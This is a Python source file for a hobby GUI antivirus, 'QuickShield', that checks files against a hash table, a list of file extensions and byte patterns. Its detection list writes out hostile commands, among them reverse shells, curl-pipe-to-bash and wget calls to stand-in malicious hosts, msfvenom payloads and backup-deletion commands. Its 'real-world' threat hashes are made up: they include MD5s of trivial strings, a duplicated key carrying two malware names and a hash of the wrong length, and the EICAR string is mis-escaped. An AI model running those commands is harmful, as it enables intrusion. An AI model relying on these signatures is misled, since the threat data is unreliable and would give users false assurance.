import os
import platform
import hashlib
import plyer
import time
import threading
import customtkinter as ctk
from plyer import notification
from tkinter import filedialog
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# Global threat database with more real-world threats
known_threats = {
    "44d88612fea8a8f36de82e1278abb02f": "EICAR Test Virus",
    "098f6bcd4621d373cade4e832627b4f6": "Trojan.Generic",
    "c157a79031e1c40f85931829bc5fc552": "Ransomware.Locker",
    "5d41402abc4b2a76b9719d911017c592": "Worm.AutoRun",
    "25d55ad283aa400af464c76d713c07ad": "Spyware.Keylogger",
    "7b8b965ad4bca0e41ab51de7b31363a1": "Trojan.Emotet",
    "a8f5f167f44f4964e6c998dee827110c": "Ransomware.WannaCry",
    "f1d3ff8443297732862df21dc4e57262": "Botnet.Zeus",
    "ec909d3d5b4c90a3cd9e87528c252fc5": "Rootkit.Satan",
    "9b74c9897bac770ffc029102a200c5de": "Trojan.DarkComet",
    "e99a18c428cb38d5f260853678922e03": "Backdoor.Agent",
    "f7c3bc1d808e04732adf679965ccc34ca7ae3441": "Worm.Stuxnet",
    "e2c420d928d4bf8ce0ff2ec19b371514": "Spyware.HawkEye",
    "c4ca4238a0b923820dcc509a6f75849b": "Trojan.LokiBot",
    "098f6bcd4621d373cade4e832627b4f6": "Ransomware.Conti",
}


# Suspicious file extensions
suspicious_extensions = {
    ".exe", ".bat", ".cmd", ".vbs", ".scr", ".js", ".ps1", ".lnk", ".wsf",
    ".dll", ".com", ".hta", ".apk", ".jar", ".pif", ".iso", ".msc", ".sys",
    ".vbe", ".wsh", ".pyc", ".class", ".tmp", ".cpl", ".reg", ".url"
}


# Known malicious script patterns
malicious_patterns = [

    b"powershell -nop -w hidden -c",
    b"powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive",
    b"powershell -enc",  # Encoded PowerShell command (malware obfuscation)
    
    b"cmd.exe /c",
    b"bash -i >& /dev/tcp/",  # Reverse shell (Linux backdoor)
    
    b"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    b"reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    
    b"eval(atob(",  # Base64-decoded JavaScript malware
    b"document.write(unescape(",  # Malicious JavaScript injection

    b"CreateObject(\"Scripting.FileSystemObject\")",
    b"CreateObject(\"WScript.Shell\").Run",
    
    b"nc -e /bin/sh",  # Netcat reverse shell
    b"nc.exe -e cmd.exe",  # Windows reverse shell
    b"socat TCP-LISTEN:",  # Linux RAT connection
    
    b"eval(base64_decode(",  # Base64 encoded PHP malware
    b"system($_GET['cmd'])",  # Remote code execution
    
    b"darkcomet.exe",  # DarkComet RAT signature
    b"njrat",  # njRAT malware string
    
    b"vssadmin.exe delete shadows /all /quiet",  # Deleting backups (ransomware)
    b"cipher /w:C:\\",  # Secure delete (ransomware wiping files)
    
    b"GetAsyncKeyState(",  # Windows keylogger function
    b"GetForegroundWindow(",  # Capturing active window (spyware)
    
    b"wget http://malicious-site.com/malware.sh",  # Downloading malware
    b"curl -sL http://malicious-link.sh | bash",  # Auto-executing malware
    
    b"msfvenom -p windows/meterpreter/reverse_tcp",
    b"msfvenom -p linux/x64/shell_reverse_tcp",
]

#GUI
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

root = ctk.CTk()
root.title("🛡️ QuickShield Antivirus")
root.geometry("700x630")
root.resizable(False, False)

def log_output(message):
    output_box.configure(state="normal")
    output_box.insert("end", message + "\n")
    output_box.configure(state="disabled")
    output_box.see("end")

def notify(title, message):
    notification.notify(title=title, message=message, timeout=5)

def scan_file(file_path=None):
    if not file_path:
        file_path = filedialog.askopenfilename()
        if not file_path:
            log_output("❌ No file selected.")
            return
    
    log_output(f"🔍 Scanning file: {file_path} ...")
    try:
        with open(file_path, "rb") as f:
            file_content = f.read()

            # Clean the content by stripping unwanted whitespace characters and line breaks
            clean_content = file_content.replace(b"\r\n", b"").replace(b"\n", b"").replace(b"\r", b"")

            # Check for known threat hashes (including EICAR MD5)
            file_hash = hashlib.md5(file_content).hexdigest()
            if file_hash in known_threats:
                message = f"🚨 Threat detected: {known_threats[file_hash]} in {file_path}"
                log_output(message)
                notify("Threat Detected!", message)
                return

            # Check for EICAR test string
            eicar_test_string = b"X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
            if eicar_test_string in file_content:
                message = f"🚨 Threat detected: EICAR Test Virus in {file_path}"
                log_output(message)
                notify("Threat Detected!", message)
                return

            # Check for suspicious extensions
            _, file_extension = os.path.splitext(file_path)
            if file_extension.lower() in suspicious_extensions:
                message = f"⚠️ Suspicious file type detected: {file_extension} in {file_path}"
                log_output(message)
                notify("Threat Detected!", message)
                return

            # Check for malware script patterns
            for pattern in malicious_patterns:
                if pattern in file_content:
                    message = f"🚨 Malicious script detected in {file_path}"
                    log_output(message)
                    notify("Threat Detected!", message)
                    return
            
            log_output(f"✅ No threats found in {file_path}.")
    except Exception as e:
        log_output(f"⚠️ Error scanning file: {e}")

def scan_folder(folder_path):
    if os.path.exists(folder_path):
        progress_bar.set(0)
        progress_label.configure(text="0% Completed")
        threading.Thread(target=scan_folder_thread, args=(folder_path,), daemon=True).start()
    else:
        log_output("❌ Invalid folder path.")

def scan_folder_thread(folder_path):
    btn_scan_folder.configure(state="disabled")
    log_output(f"🔍 Scanning folder: {folder_path} ...")
    
    files_list = [os.path.join(root_dir, file) for root_dir, _, files in os.walk(folder_path) for file in files]
    total_files = len(files_list)
    
    if total_files == 0:
        log_output("✅ No files found in the selected folder.")
        progress_bar.set(1)
        progress_label.configure(text="100% Completed")
        btn_scan_folder.configure(state="normal")
        return

    for index, file_path in enumerate(files_list):
        scan_file(file_path)
        progress = (index + 1) / total_files
        progress_bar.set(progress)
        progress_label.configure(text=f"{int(progress * 100)}% Completed")
    
    log_output("✅ Folder scan completed.")
    progress_bar.set(1)
    progress_label.configure(text="100% Completed")
    btn_scan_folder.configure(state="normal")

def scan_system_thread():
    btn_scan_system.configure(state="disabled")
    scan_path = "C:\\" if platform.system() == "Windows" else "/"
    log_output(f"🚀 Full system scan in: {scan_path} ...")
    scan_folder(scan_path)
    log_output("✅ Full system scan completed.")
    btn_scan_system.configure(state="normal")

def scan_system():
    threading.Thread(target=scan_system_thread, daemon=True).start()

class RealTimeScanner(FileSystemEventHandler):
    def on_created(self, event):
        if not event.is_directory:
            log_output(f"🔍 New file detected: {event.src_path}. Scanning...")
            scan_file(event.src_path)

    def on_modified(self, event):
        if not event.is_directory:
            log_output(f"🔄 Modified file: {event.src_path}. Scanning...")
            scan_file(event.src_path)

def start_real_time_scan_folder(folder_path):
    global observer
    if os.path.exists(folder_path):
        log_output(f"📡 Monitoring: {folder_path}")
        observer = Observer()
        event_handler = RealTimeScanner()
        observer.schedule(event_handler, folder_path, recursive=True)
        observer.start()
    else:
        log_output("❌ Invalid directory.")

def start_real_time_scan():
    global observer
    scan_path = "C:\\" if platform.system() == "Windows" else "/"
    log_output(f"📡 Monitoring system: {scan_path}")
    observer = Observer()
    event_handler = RealTimeScanner()
    observer.schedule(event_handler, scan_path, recursive=True)
    observer.start()

def stop_real_time_scan():
    global observer
    if observer:
        observer.stop()
        observer.join()
        log_output("🛑 Real-time scanning stopped.")

ctk.CTkLabel(root, text="QuickShield Antivirus", font=("Arial", 24, "bold")).pack(pady=(20, 0))
ctk.CTkLabel(root, text="________________________", font=("Arial", 20, "bold")).pack(pady=(0, 5))

btn_scan_file = ctk.CTkButton(root, text="📄 Scan File", command=scan_file, width=250, fg_color="#4CAF50")
btn_scan_file.pack(pady=5)

btn_scan_folder = ctk.CTkButton(root, text="📂 Scan Folder", command=lambda: scan_folder(filedialog.askdirectory()), width=250, fg_color="#2196F3")
btn_scan_folder.pack(pady=5)

btn_scan_system = ctk.CTkButton(root, text="🖥️ Full System Scan", command=scan_system, width=250, fg_color="#FF9800")
btn_scan_system.pack(pady=5)

btn_real_time_scan_folder = ctk.CTkButton(root, text="📡 Start Real-Time Folder Scan", command=lambda: start_real_time_scan_folder(filedialog.askdirectory()), width=250, fg_color="#9C27B0")

btn_real_time_scan_folder.pack(pady=5)

btn_real_time_scan = ctk.CTkButton(root, text="📡 Start Real-Time Scan", command=start_real_time_scan, width=250, fg_color="#9C27B0")
btn_real_time_scan.pack(pady=5)

btn_stop_real_time = ctk.CTkButton(root, text="🛑 Stop Real-Time Scan", command=stop_real_time_scan, width=250, fg_color="#F44336")
btn_stop_real_time.pack(pady=5)

output_box = ctk.CTkTextbox(root, height=250, width=650, wrap="word", state="disabled")
output_box.pack(pady=10)

progress_bar = ctk.CTkProgressBar(root, width=600)
progress_bar.set(0)
progress_bar.pack(pady=5)

progress_label = ctk.CTkLabel(root, text="0% Completed", font=("Arial", 14))
progress_label.pack(pady=5)

root.mainloop()
